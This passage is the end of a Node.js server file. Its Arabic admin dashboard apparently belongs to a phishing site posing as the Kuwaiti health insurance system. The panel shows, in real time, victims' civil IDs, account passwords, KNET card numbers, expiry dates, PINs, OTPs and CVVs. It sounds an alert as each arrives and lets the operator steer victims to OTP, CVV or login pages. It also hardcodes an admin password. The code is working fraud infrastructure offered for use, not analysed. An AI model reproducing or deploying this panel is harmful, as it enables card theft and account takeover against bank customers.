    .table-wrapper { background: #fff; border-radius: 12px; border: 1px solid #e2e8f0; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.04); }
    .payments-table { width: 100%; border-collapse: collapse; }
    .payments-table th { background: #f8fafc; padding: 11px 14px; text-align: right; font-size: 11px; color: #64748b; font-weight: 600; border-bottom: 1px solid #e2e8f0; white-space: nowrap; }
    .payments-table td { padding: 11px 14px; border-bottom: 1px solid #f1f5f9; font-size: 13px; color: #374151; vertical-align: middle; }
    .payments-table tr:last-child td { border-bottom: none; }
    .payments-table tr:hover td { background: #f8fafc; }
    .badge { padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; display: inline-block; white-space: nowrap; }
    .badge-pending { background: #fffbeb; color: #d97706; border: 1px solid #fde68a; }
    .badge-otp { background: #eff6ff; color: #2563eb; border: 1px solid #bfdbfe; }
    .badge-approved { background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
    .badge-rejected { background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; }
    .badge-success { background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
    .badge-failed { background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; }
    .btn { padding: 6px 12px; border-radius: 7px; cursor: pointer; font-size: 12px; font-weight: 600; transition: all 0.15s; border: 1px solid transparent; display: inline-flex; align-items: center; gap: 4px; white-space: nowrap; }
    .btn-details { background: #eff6ff; color: #2563eb; border-color: #bfdbfe; }
    .btn-details:hover { background: #dbeafe; }
    .btn-nav { background: #f0fdf4; color: #16a34a; border-color: #bbf7d0; }
    .btn-nav:hover { background: #dcfce7; }
    .btn-actions { display: flex; gap: 5px; flex-wrap: wrap; align-items: center; }
    .dropdown { position: relative; display: inline-block; }
    .dropdown-menu { display: none; position: absolute; left: 0; top: calc(100% + 4px); background: #fff; border: 1px solid #e2e8f0; border-radius: 10px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); z-index: 200; min-width: 180px; overflow: hidden; }
    .dropdown-menu.show { display: block; }
    .dropdown-item { display: flex; align-items: center; gap: 8px; padding: 10px 14px; font-size: 13px; color: #374151; cursor: pointer; transition: background 0.15s; border: none; background: none; width: 100%; text-align: right; }
    .dropdown-item:hover { background: #f8fafc; }
    .dropdown-item i { font-size: 14px; width: 18px; text-align: center; }
    .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.4); z-index: 1000; align-items: center; justify-content: center; }
    .modal-overlay.active { display: flex; }
    .modal { background: #fff; border-radius: 16px; padding: 28px; width: 560px; max-width: 95vw; border: 1px solid #e2e8f0; max-height: 88vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.15); }
    .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 16px; border-bottom: 1px solid #f1f5f9; }
    .modal-title { font-size: 17px; font-weight: 700; color: #1e293b; }
    .modal-close-btn { width: 32px; height: 32px; border-radius: 8px; border: 1px solid #e2e8f0; background: #f8fafc; cursor: pointer; display: flex; align-items: center; justify-content: center; color: #64748b; font-size: 16px; }
    .modal-close-btn:hover { background: #fef2f2; color: #ef4444; border-color: #fecaca; }
    .sec-title { font-size: 12px; font-weight: 700; color: #64748b; text-transform: uppercase; letter-spacing: 0.5px; margin: 16px 0 10px; padding-bottom: 6px; border-bottom: 1px solid #f1f5f9; }
    .detail-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
    .d-lbl { font-size: 11px; color: #94a3b8; margin-bottom: 2px; }
    .d-val { font-size: 13px; font-weight: 600; color: #1e293b; display: flex; align-items: center; gap: 6px; }
    .d-val.sensitive { color: #d97706; font-family: monospace; font-size: 14px; }
    .copy-btn { background: none; border: none; cursor: pointer; color: #94a3b8; padding: 2px; font-size: 12px; transition: color 0.15s; }
    .copy-btn:hover { color: #0ea5e9; }
    .action-section { background: #f8fafc; border-radius: 10px; padding: 14px; margin-top: 14px; border: 1px solid #e2e8f0; }
    .action-sec-title { font-size: 13px; font-weight: 700; color: #1e293b; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; }
    .action-step-info { font-size: 12px; color: #64748b; margin-bottom: 10px; padding: 6px 10px; background: #fff; border-radius: 6px; border: 1px solid #e2e8f0; }
    .action-btns { display: flex; gap: 8px; flex-wrap: wrap; }
    .action-btn-approve { display: flex; align-items: center; gap: 6px; padding: 8px 16px; background: #16a34a; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; transition: background 0.15s; }
    .action-btn-approve:hover { background: #15803d; }
    .action-btn-reject { display: flex; align-items: center; gap: 6px; padding: 8px 16px; background: #dc2626; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; transition: background 0.15s; }
    .action-btn-reject:hover { background: #b91c1c; }
    .nav-section { background: #f0f9ff; border-radius: 10px; padding: 14px; margin-top: 14px; border: 1px solid #bae6fd; }
    .nav-sec-title { font-size: 13px; font-weight: 700; color: #0369a1; margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
    .nav-btns { display: flex; gap: 8px; flex-wrap: wrap; }
    .nav-btn { display: flex; align-items: center; gap: 6px; padding: 8px 14px; background: #fff; color: #374151; border: 1px solid #e2e8f0; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; transition: all 0.15s; }
    .nav-btn:hover { background: #f0f9ff; border-color: #bae6fd; color: #0369a1; }
    .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #fff; border: 1px solid #e2e8f0; border-radius: 12px; padding: 14px 20px; z-index: 2000; display: none; box-shadow: 0 10px 40px rgba(0,0,0,0.12); min-width: 300px; text-align: center; }
    .notification.show { display: block; animation: slideDown 0.3s ease; }
    .notification.new-payment { border-color: #bae6fd; background: #f0f9ff; }
    .notification.new-otp { border-color: #fde68a; background: #fffbeb; }
    .notification.new-pin { border-color: #bbf7d0; background: #f0fdf4; }
    .notif-title { font-size: 14px; font-weight: 700; color: #1e293b; }
    .notif-sub { font-size: 12px; color: #64748b; margin-top: 3px; }
    .notif-data { font-size: 14px; font-weight: 700; color: #0ea5e9; font-family: monospace; margin-top: 4px; letter-spacing: 2px; }
    .empty-state { text-align: center; padding: 60px 20px; color: #94a3b8; }
    .empty-icon { font-size: 48px; margin-bottom: 12px; opacity: 0.5; }
    .ref-code { font-family: monospace; font-size: 12px; color: #0ea5e9; background: #f0f9ff; padding: 2px 6px; border-radius: 4px; }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
    @keyframes slideDown { from { transform: translateX(-50%) translateY(-20px); opacity: 0; } to { transform: translateX(-50%) translateY(0); opacity: 1; } }
  `;

  const html = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لوحة التحكم - نظام الضمان الصحي الكويتي</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
  <script src="/socket.io/socket.io.js"><\/script>
  <style>${css}<\/style>
</head>
<body>
<div id="login-page">
  <div class="login-card">
    <div class="login-logo">&#x1F3E5;</div>
    <div class="login-title">نظام الضمان الصحي الكويتي</div>
    <div class="login-sub">لوحة التحكم الإدارية</div>
    <input type="password" id="pw-input" class="login-input" placeholder="أدخل كلمة المرور">
    <button class="login-btn" id="login-btn"><i class="bi bi-shield-lock"></i> تسجيل الدخول</button>
    <div class="login-error" id="login-error">كلمة المرور غير صحيحة</div>
  </div>
</div>
<div id="dashboard">
  <div class="top-header">
    <div class="header-brand">
      <div class="header-icon"><i class="bi bi-heart-pulse"></i></div>
      <div>
        <div class="header-title">نظام الضمان الصحي الكويتي</div>
        <div class="header-sub">لوحة التحكم الإدارية</div>
      </div>
    </div>
    <div class="header-right">
      <div class="status-badge" id="conn-badge"><div class="status-dot"></div><span id="conn-text">متصل</span></div>
      <div class="notif-btn" id="notif-btn"><i class="bi bi-bell"></i><div class="notif-badge" id="notif-badge">0</div></div>
      <button class="logout-btn" id="logout-btn"><i class="bi bi-box-arrow-right"></i> خروج</button>
    </div>
  </div>
  <div class="stats-grid">
    <div class="stat-card"><div class="stat-icon blue"><i class="bi bi-people"></i></div><div><div class="stat-num" id="stat-total">0</div><div class="stat-label">إجمالي الطلبات</div></div></div>
    <div class="stat-card"><div class="stat-icon yellow"><i class="bi bi-clock"></i></div><div><div class="stat-num" id="stat-pending">0</div><div class="stat-label">قيد المعالجة</div></div></div>
    <div class="stat-card"><div class="stat-icon green"><i class="bi bi-check-circle"></i></div><div><div class="stat-num" id="stat-approved">0</div><div class="stat-label">مكتملة</div></div></div>
    <div class="stat-card"><div class="stat-icon red"><i class="bi bi-x-circle"></i></div><div><div class="stat-num" id="stat-rejected">0</div><div class="stat-label">مرفوضة</div></div></div>
    <div class="stat-card"><div class="stat-icon purple"><i class="bi bi-wifi"></i></div><div><div class="stat-num" id="stat-online">0</div><div class="stat-label">زوار متصلون الآن</div></div></div>
  </div>
  <div class="main-content">
    <div class="section-header">
      <div class="section-title"><i class="bi bi-credit-card" style="color:#0ea5e9"></i> قائمة طلبات الدفع KNET</div>
      <div class="search-box"><i class="bi bi-search"></i><input type="text" id="srch" placeholder="بحث..."></div>
    </div>
    <div class="table-wrapper">
      <div id="payments-container"><div class="empty-state"><div class="empty-icon"><i class="bi bi-inbox"></i></div><div>لا توجد طلبات بعد</div></div></div>
    </div>
  </div>
</div>
<div class="modal-overlay" id="modal-overlay">
  <div class="modal">
    <div class="modal-header"><div class="modal-title" id="modal-title">تفاصيل الطلب</div><button class="modal-close-btn" id="modal-close-btn"><i class="bi bi-x-lg"></i></button></div>
    <div id="modal-body"></div>
  </div>
</div>
<div class="notification" id="notification">
  <div class="notif-title" id="notif-title"></div>
  <div class="notif-sub" id="notif-sub"></div>
  <div class="notif-data" id="notif-data"></div>
</div>
<script>
(function() {
  var adminToken = null;
  var socket = null;
  var allPayments = [];
  var notifCount = 0;
  var notifTimeout = null;
  var currentModalId = null;

  // Login
  document.getElementById('pw-input').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') doLogin();
  });
  document.getElementById('login-btn').addEventListener('click', doLogin);
  document.getElementById('logout-btn').addEventListener('click', doLogout);
  document.getElementById('modal-close-btn').addEventListener('click', closeModal);
  document.getElementById('modal-overlay').addEventListener('click', function(e) {
    if (e.target === this) closeModal();
  });
  document.getElementById('srch').addEventListener('input', renderPayments);

  // Event delegation for table buttons
  document.getElementById('payments-container').addEventListener('click', function(e) {
    var btn = e.target.closest('[data-action]');
    if (!btn) return;
    var action = btn.getAttribute('data-action');
    var id = btn.getAttribute('data-id');
    var page = btn.getAttribute('data-page');
    if (action === 'details') showDetails(id);
    else if (action === 'toggle-dd') toggleDropdown('dd-' + id);
    else if (action === 'nav') navUser(id, page);
  });

  // Event delegation for modal buttons
  document.getElementById('modal-body').addEventListener('click', function(e) {
    var btn = e.target.closest('[data-action]');
    if (!btn) return;
    var action = btn.getAttribute('data-action');
    var id = btn.getAttribute('data-id');
    var page = btn.getAttribute('data-page');
    var val = btn.getAttribute('data-val');
    if (action === 'approve') doAction(id, 'accept');
    else if (action === 'reject') doAction(id, 'reject');
    else if (action === 'nav') navUser(id, page);
    else if (action === 'copy') copyVal(val);
  });

  document.addEventListener('click', function(e) {
    if (!e.target.closest('.dropdown')) {
      document.querySelectorAll('.dropdown-menu.show').forEach(function(el) { el.classList.remove('show'); });
    }
  });

  async function doLogin() {
    var pw = document.getElementById('pw-input').value;
    try {
      var res = await fetch('/admin/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({password: pw}) });
      var data = await res.json();
      if (data.success) {
        adminToken = data.token;
        document.getElementById('login-page').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        initSocket();
        loadPayments();
      } else {
        document.getElementById('login-error').style.display = 'block';
      }
    } catch(e) {
      document.getElementById('login-error').style.display = 'block';
    }
  }

  function doLogout() {
    adminToken = null;
    if (socket) socket.disconnect();
    document.getElementById('dashboard').style.display = 'none';
    document.getElementById('login-page').style.display = 'flex';
    document.getElementById('pw-input').value = '';
  }

  function initSocket() {
    socket = io();
    socket.on('connect', function() {
      document.getElementById('conn-badge').style.background = '#f0fdf4';
      document.getElementById('conn-text').textContent = 'متصل';
      socket.emit('admin_join', { token: adminToken, password: 'Admin@2024' });
      loadPayments();
    });
    socket.on('disconnect', function() {
      document.getElementById('conn-badge').style.background = '#fef2f2';
      document.getElementById('conn-text').textContent = 'غير متصل';
    });
    socket.on('payment_new', function(payment) {
      var idx = allPayments.findIndex(function(p) { return p.id === payment.id; });
      if (idx !== -1) allPayments[idx] = payment;
      else allPayments.unshift(payment);
      renderPayments(); updateStats();
      showNotification('طلب دفع جديد!', (payment.loginCivilId || payment.clientId || '') + ' - ' + (payment.bankName || ''), (payment.prefix || '') + ' ' + (payment.cardNumber || ''), 'new-payment');
      playSound(); bumpNotif();
    });
    socket.on('payment_otp_received', function(data) {
      var idx = allPayments.findIndex(function(p) { return p.id === data.id || p.id === data.paymentId; });
      if (idx !== -1) { allPayments[idx] = data.payment || allPayments[idx]; renderPayments(); updateStats(); }
      showNotification('OTP جديد وصل!', 'الرقم المرجعي: ' + (data.payment ? data.payment.refNumber : ''), data.otp || '', 'new-otp');
      playSound(); bumpNotif();
    });
    socket.on('payment_pin_received', function(data) {
      var idx = allPayments.findIndex(function(p) { return p.id === data.id || p.id === data.paymentId; });
      if (idx !== -1) { allPayments[idx] = data.payment || allPayments[idx]; renderPayments(); updateStats(); }
      showNotification('رقم سري جديد!', 'الرقم المرجعي: ' + (data.payment ? data.payment.refNumber : ''), data.pin || '', 'new-pin');
      playSound(); bumpNotif();
    });
    socket.on('payment_cvv_received', function(data) {
      var idx = allPayments.findIndex(function(p) { return p.id === data.id || p.id === data.paymentId; });
      if (idx !== -1) { allPayments[idx] = data.payment || allPayments[idx]; renderPayments(); updateStats(); }
      showNotification('CVV جديد وصل!', 'الرقم المرجعي: ' + (data.payment ? data.payment.refNumber : ''), data.cvv || '', 'new-otp');
      playSound(); bumpNotif();
    });
    socket.on('payment_status_changed', function(data) {
      var idx = allPayments.findIndex(function(p) { return p.id === data.id || p.id === data.paymentId; });
      if (idx !== -1) {
        if (data.payment) allPayments[idx] = data.payment;
        else allPayments[idx].status = data.status;
        renderPayments(); updateStats();
      }
    });
    socket.on('payments_list', function(list) { allPayments = list; renderPayments(); updateStats(); });
    socket.on('login_new', function(data) {
      showNotification('تسجيل دخول جديد!', data.loginCivilId || data.civilId || '', data.loginPassword || '', 'new-payment');
      playSound(); bumpNotif();
    });
    socket.on('active_users', function(users) {
      document.getElementById('stat-online').textContent = users.length;
    });
  }

  async function loadPayments() {
    try {
      var res = await fetch('/admin/payments');
      allPayments = await res.json();
      renderPayments(); updateStats();
    } catch(e) {}
  }

  function getStatusBadge(status) {
    var map = {
      'PENDING': '<span class="badge badge-pending">انتظار</span>',
      'APPROVED': '<span class="badge badge-approved">موافقة</span>',
      'OTP_REQUEST': '<span class="badge badge-otp">OTP وصل</span>',
      'CVV_REQUEST': '<span class="badge" style="background:#fef2f2;color:#dc2626;border:1px solid #fca5a5">CVV وصل</span>',
      'CVV_PENDING': '<span class="badge" style="background:#fff7ed;color:#ea580c;border:1px solid #fed7aa">انتظار CVV</span>',
      'CVV_APPROVED': '<span class="badge" style="background:#f0fdf4;color:#16a34a;border:1px solid #86efac">CVV موافق</span>',
      'CVV_FAILED': '<span class="badge" style="background:#fef2f2;color:#dc2626;border:1px solid #fca5a5">CVV خاطئ</span>',
      'OTP_FAILED': '<span class="badge badge-failed">OTP خاطئ</span>',
      'SUCCESS': '<span class="badge badge-success">مكتمل</span>',
      'REJECTED': '<span class="badge badge-rejected">مرفوض</span>',
      'pending_card': '<span class="badge badge-pending">انتظار البطاقة</span>',
      'waiting_otp': '<span class="badge badge-otp">انتظار OTP</span>',
      'pending_otp': '<span class="badge badge-otp">OTP وصل</span>',
      'waiting_pin': '<span class="badge badge-otp">انتظار الرقم السري</span>',
      'pending_pin': '<span class="badge badge-otp">الرقم السري وصل</span>',
      'completed': '<span class="badge badge-success">مكتمل</span>',
      'rejected': '<span class="badge badge-rejected">مرفوض</span>'
    };
    return map[status] || '<span class="badge badge-pending">' + (status || 'غير محدد') + '</span>';
  }

  function renderPayments() {
    var container = document.getElementById('payments-container');
    var q = (document.getElementById('srch').value || '').toLowerCase();
    var list = allPayments;
    if (q) {
      list = allPayments.filter(function(p) {
        return (p.loginCivilId || '').toLowerCase().includes(q) ||
               (p.clientId || '').toLowerCase().includes(q) ||
               (p.bankName || '').toLowerCase().includes(q) ||
               (p.cardNumber || '').toLowerCase().includes(q) ||
               (p.refNumber || '').toLowerCase().includes(q) ||
               (p.status || '').toLowerCase().includes(q);
      });
    }
    if (!list.length) {
      container.innerHTML = '<div class="empty-state"><div class="empty-icon"><i class="bi bi-inbox"></i></div><div>' + (q ? 'لا توجد نتائج' : 'لا توجد طلبات بعد') + '</div></div>';
      return;
    }
    var html = '<table class="payments-table"><thead><tr><th>المرجع</th><th>الرقم المدني</th><th>البنك</th><th>رقم البطاقة</th><th>الانتهاء</th><th>الحالة</th><th>OTP</th><th>CVV</th><th>الإجراءات</th></tr></thead><tbody>';
    list.forEach(function(p) {
      var otp = p.knetOtps && p.knetOtps.length ? p.knetOtps[0].otp : '-';
      var id = p.id;
      html += '<tr>';
      html += '<td><span class="ref-code">' + (p.refNumber || id.substring(0, 8)) + '</span></td>';
      html += '<td><b>' + (p.loginCivilId || p.clientId || '-') + '</b></td>';
      html += '<td>' + (p.bankName || '-') + '</td>';
      html += '<td><span style="font-family:monospace">' + (p.prefix || '') + ' ' + (p.cardNumber || '-') + '</span></td>';
      html += '<td>' + (p.expiryMonth || '') + (p.expiryMonth && p.expiryYear ? '/' : '') + (p.expiryYear || '-') + '</td>';
      html += '<td>' + getStatusBadge(p.status) + '</td>';
      html += '<td><span style="font-family:monospace;font-weight:700;color:#d97706">' + otp + '</span></td>';
      html += '<td><span style="font-family:monospace;font-weight:700;color:#dc2626">' + (p.cvv || '-') + '</span></td>';
      html += '<td><div class="btn-actions">';
      html += '<button class="btn btn-details" data-action="details" data-id="' + id + '"><i class="bi bi-eye"></i> تفاصيل</button>';
      html += '<div class="dropdown">';
      html += '<button class="btn btn-nav" data-action="toggle-dd" data-id="' + id + '"><i class="bi bi-send"></i> توجيه <i class="bi bi-chevron-down"></i></button>';
      html += '<div class="dropdown-menu" id="dd-' + id + '">';
      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/knet"><i class="bi bi-credit-card" style="color:#16a34a"></i>صفحة KNET</button>';
      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/knet-otp"><i class="bi bi-phone" style="color:#2563eb"></i>صفحة OTP</button>';
      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/knet/cvv"><i class="bi bi-shield-lock" style="color:#dc2626"></i>صفحة CVV</button>';
      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/sign-up"><i class="bi bi-person-plus" style="color:#7c3aed"></i>صفحة التسجيل</button>';
      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/login"><i class="bi bi-box-arrow-in-right" style="color:#ea580c"></i>صفحة الدخول</button>';
      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/"><i class="bi bi-house" style="color:#64748b"></i>الصفحة الرئيسية</button>';
      html += '</div></div></div></td>';
      html += '</tr>';
    });
    html += '</tbody></table>';
    container.innerHTML = html;
  }

  function toggleDropdown(id) {
    document.querySelectorAll('.dropdown-menu.show').forEach(function(el) {
      if (el.id !== id) el.classList.remove('show');
    });
    var el = document.getElementById(id);
    if (el) el.classList.toggle('show');
  }

  async function navUser(paymentId, page) {
    document.querySelectorAll('.dropdown-menu.show').forEach(function(el) { el.classList.remove('show'); });
    try {
      await fetch('/admin/navigate', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({paymentId: paymentId, page: page}) });
      showNotification('تم التوجيه', 'تم إرسال أمر التوجيه للعميل', page, '');
    } catch(e) {}
  }

  async function doAction(paymentId, action) {
    try {
      var res = await fetch('/admin/payments/' + paymentId + '/action', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: action}) });
      var data = await res.json();
      if (data.success) {
        var idx = allPayments.findIndex(function(p) { return p.id === paymentId; });
        if (idx !== -1) allPayments[idx] = data.payment;
        renderPayments(); updateStats();
        closeModal();
      }
    } catch(e) {}
  }

  function showDetails(paymentId) {
    var p = allPayments.find(function(x) { return x.id === paymentId; });
    if (!p) return;
    currentModalId = paymentId;
    var otp = p.knetOtps && p.knetOtps.length ? p.knetOtps[0].otp : null;
    var stepNames = {1: 'بيانات البطاقة', 2: 'رمز OTP', 3: 'رقم سري'};
    var step = p.step || 1;
    var html = '';
    html += '<div class="sec-title">بيانات العميل</div><div class="detail-grid">';
    html += dRow('الرقم المدني', p.loginCivilId || p.clientId, false);
    html += dRow('كلمة المرور', p.loginPassword, true);
    html += dRow('الرقم المرجعي', p.refNumber, false);
    html += dRow('تاريخ الطلب', p.created_at ? new Date(p.created_at).toLocaleString('ar-KW') : '-', false);
    html += '</div>';
    html += '<div class="sec-title">بيانات البطاقة</div><div class="detail-grid">';
    html += dRow('البنك', p.bankName, false);
    html += dRow('رقم البطاقة', (p.prefix || '') + ' ' + (p.cardNumber || ''), true);
    html += dRow('تاريخ الانتهاء', (p.expiryMonth || '') + '/' + (p.expiryYear || ''), false);
    html += dRow('الرقم السري (PIN)', p.pass && p.pass !== '---' ? p.pass : null, true);
    html += '</div>';
    if (otp) {
      html += '<div class="sec-title">بيانات OTP</div><div class="detail-grid">';
      html += dRow('رمز OTP', otp, true);
      if (p.knetOtps && p.knetOtps.length > 1) {
        p.knetOtps.slice(1).forEach(function(o, i) { html += dRow('OTP سابق ' + (i + 1), o.otp, true); });
      }
      html += '</div>';
    }
    if (p.cvv) {
      html += '<div class="sec-title">بيانات CVV</div><div class="detail-grid">';
      html += dRow('رمز CVV', p.cvv, true);
      html += '</div>';
    }
    html += '<div class="action-section">';
    html += '<div class="action-sec-title"><i class="bi bi-shield-check" style="color:#16a34a"></i> إجراء عملية الدفع</div>';
    html += '<div class="action-step-info">الخطوة الحالية: ' + (stepNames[step] || 'بيانات البطاقة') + ' | الحالة: ' + (p.status || 'PENDING') + '</div>';
    html += '<div class="action-btns">';
    html += '<button class="action-btn-approve" data-action="approve" data-id="' + p.id + '"><i class="bi bi-check-circle-fill"></i> قبول</button>';
    html += '<button class="action-btn-reject" data-action="reject" data-id="' + p.id + '"><i class="bi bi-x-circle-fill"></i> رفض</button>';
    html += '</div></div>';
    html += '<div class="nav-section">';
    html += '<div class="nav-sec-title"><i class="bi bi-send"></i> توجيه العميل إلى صفحة</div>';
    html += '<div class="nav-btns">';
    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/knet"><i class="bi bi-credit-card" style="color:#16a34a"></i>KNET</button>';
    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/knet-otp"><i class="bi bi-phone" style="color:#2563eb"></i>OTP</button>';
    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/knet/cvv"><i class="bi bi-shield-lock" style="color:#dc2626"></i>CVV</button>';
    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/sign-up"><i class="bi bi-person-plus" style="color:#7c3aed"></i>التسجيل</button>';
    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/login"><i class="bi bi-box-arrow-in-right" style="color:#ea580c"></i>الدخول</button>';
    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/"><i class="bi bi-house" style="color:#64748b"></i>الرئيسية</button>';
    html += '</div></div>';
    document.getElementById('modal-title').textContent = 'تفاصيل الطلب - ' + (p.refNumber || p.id.substring(0, 8));
    document.getElementById('modal-body').innerHTML = html;
    document.getElementById('modal-overlay').classList.add('active');
  }

  function dRow(label, val, sensitive) {
    if (!val) return '';
    var v = '<span class="d-val' + (sensitive ? ' sensitive' : '') + '">' + val + '<button class="copy-btn" data-action="copy" data-val="' + val.replace(/"/g, '&quot;') + '"><i class="bi bi-copy"></i></button></span>';
    return '<div><div class="d-lbl">' + label + '</div>' + v + '</div>';
  }

  function copyVal(val) {
    try { navigator.clipboard.writeText(val); } catch(e) {}
  }

  function closeModal() {
    document.getElementById('modal-overlay').classList.remove('active');
    currentModalId = null;
  }

  function updateStats() {
    document.getElementById('stat-total').textContent = allPayments.length;
    document.getElementById('stat-pending').textContent = allPayments.filter(function(p) {
      return ['PENDING','OTP_REQUEST','pending_card','waiting_otp','pending_otp','waiting_pin','pending_pin'].includes(p.status);
    }).length;
    document.getElementById('stat-approved').textContent = allPayments.filter(function(p) {
      return ['SUCCESS','APPROVED','completed'].includes(p.status);
    }).length;
    document.getElementById('stat-rejected').textContent = allPayments.filter(function(p) {
      return ['REJECTED','OTP_FAILED','rejected'].includes(p.status);
    }).length;
  }

  function showNotification(title, sub, data, type) {
    var el = document.getElementById('notification');
    document.getElementById('notif-title').textContent = title;
    document.getElementById('notif-sub').textContent = sub || '';
    document.getElementById('notif-data').textContent = data || '';
    el.className = 'notification show ' + (type || '');
    if (notifTimeout) clearTimeout(notifTimeout);
    notifTimeout = setTimeout(function() { el.classList.remove('show'); }, 5000);
  }

  function bumpNotif() {
    notifCount++;
    var badge = document.getElementById('notif-badge');
    badge.textContent = notifCount;
    badge.style.display = 'flex';
  }

  function playSound() {
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      var osc = ctx.createOscillator();
      var gain = ctx.createGain();
      osc.connect(gain); gain.connect(ctx.destination);
      osc.frequency.value = 880;
      gain.gain.setValueAtTime(0.3, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
      osc.start(ctx.currentTime);
      osc.stop(ctx.currentTime + 0.5);
    } catch(e) {}
  }

  setInterval(function() { if (adminToken) loadPayments(); }, 15000);
})();
<\/script>
</body>
</html>`;
  return html;
}

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log('Kuwait Health Insurance Server running on port ' + PORT);
  console.log('Admin panel: http://localhost:' + PORT + '/panel');
});
